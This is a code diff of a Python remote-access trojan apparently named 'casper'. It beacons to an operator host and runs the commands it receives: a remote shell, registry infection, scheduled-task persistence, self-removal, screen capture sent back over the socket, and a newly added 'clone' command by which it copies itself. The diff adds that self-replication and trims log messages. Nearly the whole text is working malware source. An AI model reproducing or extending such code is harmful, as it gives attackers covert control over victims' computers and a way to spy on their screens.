@@ -10,20 +10,20 @@ def socket_create():
 		socket_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		return True
 	except socket.error as e:
-		logging.debug("[casper] Unable to setup socket >> {}".format(e))
+		logging.debug("[casper] Unable to setup socket > {}".format(e))
 
 def socket_test():
 	test_host = "google.com"
 	test_port = 80
 
-	logging.debug("[casper] Testing our connection on {}:{}, please wait!".format(test_host,test_port))
+	logging.debug("[casper] Testing our connection on {}:{}".format(test_host,test_port))
 	if (socket_create() == True):
 		try:
 			socket_server.connect((test_host,test_port))
-			logging.debug("[casper] Connection seems alright!")
+			logging.debug("[casper] Connection seems alright")
 			return True
 		except Exception as e:
-			logging.debug("[casper] Unable to connect >> {}".format(e))
+			logging.debug("[casper] Unable to connect > {}".format(e))
 		socket_server.close()
 
 def socket_control():
@@ -37,7 +37,7 @@ def socket_control():
 				try:
 					logging.debug("[casper] Connecting to {}:{}".format(host,port))
 					socket_server.connect((host,port))
-					logging.debug("[casper] Connection established!")
+					logging.debug("[casper] Connection established")
 					while True:
 						data = decode(socket_server.recv(buffer))
 						if (data.split()[0] == "shell"):
@@ -65,10 +65,15 @@ def socket_control():
 							else:
 								socket_server.send(encode("\nError during registry infection\n"))
 						elif (data.split()[0] == "removal"):
-							if (removal() == True):
+							if (removal("temp.bat") == True):
 								socket_server.send(encode("\nSuccessfully deleted myself\n"))
 							else:
 								socket_server.send(encode("\nError during deletion of myself\n"))
+						elif (data.split()[0] == "clone"):
+							if (clone(sys.argv[0]) == True):
+								socket_server.send(encode("\nSuccessfully cloned myself\n"))
+							else:
+								socket_server.send(encode("\nError during cloning of myself\n"))				
 						elif (data.split()[0] == "schtasks"):
 							if (data.split()[1] == "create"):
 								if (create_task(data.split()[2],data.split()[3]) == True):
@@ -83,14 +88,14 @@ def socket_control():
 								else:
 									socket_server.send(encode("\Error while running schtask\n"))
 							else:
-								pass									
+								pass
 							if (data.split()[1] == "delete"):
 								if  (del_task(data.split()[2]) == True):
 									socket_server.send(encode("\nSuccessfully deleted schtask\n"))
 								else:
 									socket_server.send(encode("\Error during deletion of schtask\n"))
 							else:
-								pass									
+								pass								
 						elif (data.split()[0] == "screenshot"):
 								try:
 									with mss.mss() as screen:
@@ -99,24 +104,21 @@ def socket_control():
 										
 										logging.debug('[casper] Reading image raw_bytes')
 										raw_bytes = mss.tools.to_png(image.rgb,image.size)
-										
 										logging.debug('[casper] Successfully read image raw_bytes')
+										
 										socket_server.send(encode(raw_bytes))
 										socket_server.send(encode("\nSuccessfully received screenshot\n"))	
 								except Exception as e:
-									logging.debug("[casper] Error saving screenshot >> {}".format(e))
+									logging.debug("[casper] Error saving screenshot > {}".format(e))
 						else:
 							pass
 				except Exception as e:
-					logging.debug("[casper] Unable to connect >> {}".format(e))
+					logging.debug("[casper] {}".format(e))
 			else:
-				logging.debug("[casper] Unable to setup socket!")
-			
-			logging.debug("[casper] Closing socket")
+				logging.debug("[casper] Unable to setup socket")
+	
 			socket_server.close()
-			
-			logging.debug("[casper] Idling a while")
 			time.sleep(random.randint(5,15))
 	else:
-		logging.debug("[casper] Quiting...")
+		logging.debug("[casper] Quiting")
 		sys.exit()
